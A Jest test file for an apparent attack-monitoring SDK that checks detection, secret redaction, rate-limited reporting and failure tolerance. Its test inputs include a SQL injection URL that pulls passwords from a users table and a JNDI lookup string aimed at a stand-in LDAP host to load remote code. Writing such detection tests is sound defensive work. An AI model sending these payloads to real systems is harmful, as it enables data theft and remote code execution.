import { afterEach, beforeEach, describe, expect, it, jest } from "@jest/globals";
import { readFileSync } from "node:fs";
import { dirname, resolve } from "node:path";
import { createAppMonitor } from "../src/sdk.js";

const TOKEN = "beam_app_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFG";
const originalFetch = global.fetch;
let posted: { url: string; auth: string | null; body: { findings: { ruleId: string; file?: string; title: string; evidence: string }[] } }[];
let configStatus: number;
const tick = () => new Promise(r => setTimeout(r, 0));

beforeEach(() => {
  posted = [];
  configStatus = 200;
  global.fetch = jest.fn(async (input: string | URL | Request, init?: RequestInit) => {
    const url = String(input);
    if (url.endsWith("/v1/monitor/config"))
      return configStatus === 200
        ? Response.json({ enabled: true, app: "bgremover", level: "standard" })
        : Response.json({ error: "App monitoring is turned off for this workspace." }, { status: configStatus });
    posted.push({ url, auth: new Headers(init?.headers).get("authorization"), body: JSON.parse(String(init?.body)) });
    return Response.json({ accepted: 1 }, { status: 202 });
  }) as typeof fetch;
});
afterEach(() => { global.fetch = originalFetch; });

const attack = { method: "GET", url: "/api/items?id=1%20UNION%20SELECT%20password%20FROM%20users&token=s3cr3t", ip: "203.0.113.9", userAgent: "Mozilla/5.0 Chrome/155.0.0.0" };

describe("createAppMonitor", () => {
  it("is a silent no-op without a valid token or over plain HTTP", () => {
    const errors: string[] = [];
    expect(createAppMonitor({ token: "", onError: m => errors.push(m) }).enabled).toBe(false);
    expect(createAppMonitor({ token: "nope" }).enabled).toBe(false);
    expect(createAppMonitor({ token: TOKEN, dashboardUrl: "http://dash.example.com", onError: m => errors.push(m) }).enabled).toBe(false);
    expect(errors.join("\n")).toContain("BEAM_APP_TOKEN");
    expect(errors.join("\n")).toContain("plain HTTP");
    expect(global.fetch).not.toHaveBeenCalled();
  });
  it("detects attacks in requests in-process and sends only redacted findings, as the app", async () => {
    const monitor = createAppMonitor({ token: TOKEN, dashboardUrl: "https://dash.test" });
    await tick();
    monitor.request({ method: "GET", url: "/", ip: "203.0.113.9" });
    monitor.request(attack);
    monitor.request(attack);
    await monitor.flush();
    expect(posted).toHaveLength(1);
    expect(posted[0]).toMatchObject({ url: "https://dash.test/v1/monitor/findings", auth: `Bearer ${TOKEN}` });
    const [finding] = posted[0]!.body.findings;
    expect(finding).toMatchObject({ ruleId: "web.sql_injection", file: "requests", title: "SQL injection attempt from 203.0.113.9" });
    expect(finding!.evidence).not.toContain("s3cr3t");
    expect(posted[0]!.body.findings).toHaveLength(1); // the repeat folded into the same finding
  });
  it("sends at most once per interval when flush() runs on every request, unless forced", async () => {
    const monitor = createAppMonitor({ token: TOKEN, dashboardUrl: "https://dash.test", flushIntervalMs: 60_000 });
    await tick();
    monitor.request(attack); // first finding: sent right away
    await monitor.flush();
    monitor.request({ ...attack, url: "/?q=${jndi:ldap://x.test/a}", ip: "198.51.100.7" });
    await monitor.flush();
    await monitor.flush();
    expect(posted).toHaveLength(1);
    await monitor.flush({ force: true });
    expect(posted).toHaveLength(2);
    expect(posted[1]!.body.findings[0]!.ruleId).toBe("web.jndi_injection");
  });
  it("captures nothing while App monitoring is off for the workspace", async () => {
    configStatus = 403;
    const monitor = createAppMonitor({ token: TOKEN, dashboardUrl: "https://dash.test" });
    await tick();
    monitor.request(attack);
    await monitor.flush();
    expect(posted).toHaveLength(0);
  });
  it("stops for good when the token is rotated or removed", async () => {
    configStatus = 401;
    const errors: string[] = [];
    const monitor = createAppMonitor({ token: TOKEN, dashboardUrl: "https://dash.test", onError: m => errors.push(m) });
    await tick();
    monitor.request(attack);
    await monitor.flush();
    expect(posted).toHaveLength(0);
    expect(errors.join("\n")).toContain("rotated or removed");
  });
  it("never throws into the app, even when AgentBeam is unreachable", async () => {
    global.fetch = jest.fn(async () => { throw new Error("ECONNREFUSED"); }) as typeof fetch;
    const monitor = createAppMonitor({ token: TOKEN, dashboardUrl: "https://dash.test" });
    await tick();
    expect(() => monitor.request(attack)).not.toThrow();
    expect(() => monitor.request(null as never)).not.toThrow();
    expect(() => monitor.log(undefined as never)).not.toThrow();
    await expect(monitor.flush()).resolves.toBeUndefined();
  });
});

describe("edge runtime safety", () => {
  it("the SDK's runtime imports use no Node.js built-ins or packages", () => {
    const seen = new Set<string>();
    const bad: string[] = [];
    const walk = (file: string) => {
      if (seen.has(file)) return;
      seen.add(file);
      const source = readFileSync(file, "utf8");
      for (const m of source.matchAll(/^import\s+(?!type\b)[^;]*?from\s+"([^"]+)"/gm)) {
        const spec = m[1]!;
        if (!spec.startsWith(".")) bad.push(`${file}: ${spec}`);
        else walk(resolve(dirname(file), spec.replace(/\.js$/, ".ts")));
      }
    };
    walk(resolve("src/sdk.ts"));
    expect(bad).toEqual([]);
    expect([...seen].map(f => f.split("/").pop()).sort()).toEqual(["monitor-pipeline.ts", "monitor-rules.ts", "rule-catalog.ts", "sdk.ts"]);
  });
});
